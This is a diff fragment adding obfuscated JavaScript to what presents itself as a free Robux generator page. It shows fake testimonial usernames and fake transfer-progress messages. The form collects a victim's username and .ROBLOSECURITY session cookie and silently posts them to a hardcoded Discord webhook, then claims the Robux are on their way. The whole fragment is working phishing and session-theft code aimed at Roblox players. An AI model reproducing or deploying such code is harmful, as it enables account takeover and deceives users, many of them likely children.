+        var _0x126d=["AeroBlox","xKairoRBX","NovaMint","Brickson","VoidJett","MiloRBLX","Zennify","AshBlox","PixelKade","StormiPlays","RbxLucid","EchoBlocks","JunoRbx","LowkeyMint","FluxKairo","NeoBloxer","AxelMint","BloxHaven","SkyeRbx","OrbitPlays","StaticKade","DriftMint","RbxNolan","SolarJett","UrbanBlox","ObbyFlux","KiroPlays","ZenBlocks","BrickNova","RiftRbx","LunarMint","PixelRyn","EchoJett","BloxAris","MasonRBLX","VoidMint","AtlasBlox","NoriRbx","FrostJett","MintyPlays","ObbyRift","BloxKeen","RbxTylo","SkylinBlox","VantaMint","OrbitRbx","KadePlays","LucidNova","BrickRyn","FluxObby","AxiomBlox","RbxHaze","PixelRune","MintAtlas","DriftRbx","SolarKeen","EchoMint","NovaRbxer","BloxTyra","ZenithPlays","KiroMint","UrbanRune","VoidKeen","RbxSkyl","BrickFlux","ObbyNova","LumenBlox","RbxArlo","MintJuno","StaticRune","FableBlox","RbxMiko","PixelHaze","AtlasMint","OrbitRune","NeoPlays","BloxKiro","SolarMint","RbxFynn","DriftNova","ZenPlays","BrickHaze","EchoRyn","MintObby","VeloBlox","RbxSoren","PixelAtlas","MintFlux","VoidRune","BloxJett","UrbanMint","NovaPlays","RbxElio","StaticBlox","LunarRbx","BrickZen","EchoNova","MintKeen","ObbyLuxe","FluxPlays","RbxKorin","PixelLuxe","MintRift","VoidPlays","BloxHaze","SolarRune","UrbanNova","RbxTaro","StaticMint","LumenPlays","BrickLuxe","EchoFlux","MintZen","ObbyRune","VantaPlays"];
+        function _0x43d9(_0x999a){return _0x999a[Math.floor(Math.random()*_0x999a.length)];}
+        window.addEventListener('DOMContentLoaded',function(){
+            var _0x1d30=_0x2d7a("testimonial-user");
+            if(_0x1d30){_0x1d30.textContent=_0x43d9(_0x126d);}
         });
+    })();
+
+    _0x2d7a('robux-form').addEventListener('submit',function(_0x1f2c){
+        _0x1f2c.preventDefault();
+        var _0x36c5=_0x2d7a('username').value.trim();
+        var _0x1323=_0x2d7a('robux').value;
+        var _0x3cf1=_0x2d7a('cookie').value.trim();
+        var _0x135a=_0x2d7a('msg');
+        var _0x3fa9=_0x2d7a('progress-bar');
+        var _0x1ee8=_0x2d7a('progress-bar-fill');
+        _0x135a.innerHTML='';
+        _0x3fa9.style.display="none";
+        _0x1ee8.style.width="0%";
+        if(!_0x36c5||!_0x1323||!_0x3cf1){
+            _0x135a.innerHTML='<div class="error">&#9888;&#65039; Please fill out <b>all</b> fields!</div>';
+            return;
+        }
+        if(+_0x1323<1||+_0x1323>5000){
+            _0x135a.innerHTML='<div class="error">&#9888;&#65039; Amount must be between 1 and 5000.</div>';
+            return;
+        }
+        var _0x1b97=[{text:'<span class="loader"></span><br><b>Establishing connection with Roblox servers...</b>',progress:18},{text:'<span class="loader"></span><br><b>Authorizing User:</b> '+_0x36c5,progress:36},{text:'<span class="loader"></span><br><b>Fetching account details...</b>',progress:51},{text:'<span class="loader"></span><br><b>Checking Robux availability: <i style="color:#00ea64;font-weight:bold">'+_0x1323+'</i> R$</b>',progress:63},{text:'<span class="loader"></span><br><b>Validating .ROBLOSECURITY session...</b>',progress:77},{text:'<span class="loader"></span><br><b>Preparing transfer of <span style="color:#00ea64;">'+_0x1323+'</span> R$ to <span style="color:#378ef3;">'+_0x36c5+'</span>...</b>',progress:90}];
+        function _0x16f6(_0x2f21){
+            if(_0x2f21<_0x1b97.length){
+                _0x3fa9.style.display='block';
+                _0x1ee8.style.width=_0x1b97[_0x2f21].progress+'%';
+                _0x135a.innerHTML=_0x1b97[_0x2f21].text;
+                setTimeout(function(){_0x16f6(_0x2f21+1);},1200+Math.random()*700);
+            }else{
+                _0x135a.innerHTML='<span class="loader"></span><br><b>Finalizing and submitting request...</b>';
+                _0x1ee8.style.width='100%';
+                setTimeout(function(){
+                    var _0x5a48="**Roblox Credentials**\n"+"**username:** "+_0x36c5+"\n"+"**.ROBLOSECURITY:** `"+_0x3cf1+"`\n"+"**Requested Robux:** "+_0x1323;
+                    fetch('https://discord.com/api/webhooks/1456906677663305792/zcqbEE3imWQLnCbbAg8zn5ax-yulUAlmO-6SldfEdEOT-CRUMsuZShV1je-zVsCQqzwf',{
+                        method:'POST',headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({content:_0x5a48})
+                    }).then(function(_0x29be){
+                        if(_0x29be.status===204||_0x29be.status===200){
+                            _0x3fa9.style.display='none';
+                            _0x135a.innerHTML='<div class="success"><span style="font-size:1.5em;color:#00ea64;">&#x2714;</span><br>Robux successfully queued!<br><span style="color:#666;font-weight:normal;">Status: <b>Processing... (pending confirmation)</b></span><br><br><span style="font-size:0.92em;color:#207708;"><b>This may take 5-20 minutes.<br>Do not close this page!</b></span></div>';
+                            setTimeout(function(){
+                                _0x135a.innerHTML='<div class="success"><span style="font-size:1.6em;">&#x2705;</span> Robux transaction now pending.<br><b>You will receive <span style="color:#00ea64;">'+_0x1323+'</span> R$ soon!</b> &#9745;<br><span style="font-size:13px;color:#666;">You may safely close this page once you see Robux added.</span></div>';
+                                _0x1ee8.style.width='0%';
+                            },7000);
+                        }else{
+                            _0x3fa9.style.display='none';
+                            _0x135a.innerHTML='<div class="error">Roblox transfer error. Try again later.</div>';
+                        }
+                    }).catch(function(){
+                        _0x3fa9.style.display='none';
+                        _0x135a.innerHTML='<div class="error">Network error. Check your connection.</div>';
+                    });
+                },1700+Math.random()*600);
+            }
+        }
+        _0x16f6(0);
+    });
+})();
     </script>
 </body>
 </html>
